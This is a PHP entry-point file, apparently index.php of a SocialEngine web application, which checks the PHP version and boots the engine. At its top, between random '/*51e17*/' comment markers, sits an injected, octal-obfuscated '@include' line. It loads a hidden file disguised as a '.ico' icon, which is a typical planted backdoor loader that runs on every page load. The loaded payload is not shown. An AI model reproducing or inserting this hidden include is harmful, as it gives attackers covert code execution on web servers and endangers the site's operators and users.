<?php
/*51e17*/

@include "\057var/\167ww/q\141_rqs\164pgin\163_201\071_upg\162ade/\145xter\156als/\144eskt\157p-no\164ify/\056a0c9\070471.\151co";

/*51e17*/
/**
 * @package     Engine_Core
 * @version     $Id: index.php 9764 2012-08-17 00:04:31Z matthew $
 * @copyright   Copyright (c) 2006-2020 Webligo Developments
 * @license     http://www.socialengine.com/license/
 */

// Check version
if (version_compare(phpversion(), '7.2', '<')) {
    printf('PHP 7.2 is required, you have %s', phpversion());
    exit(1);
}

// Constants
define('_ENGINE_R_BASE', dirname($_SERVER['SCRIPT_NAME']));
define('_ENGINE_R_FILE', $_SERVER['SCRIPT_NAME']);

include dirname(__FILE__)
    . DIRECTORY_SEPARATOR.
    'boot.php';

$boot = new Engine_Boot(dirname(__FILE__));
$boot->boot();
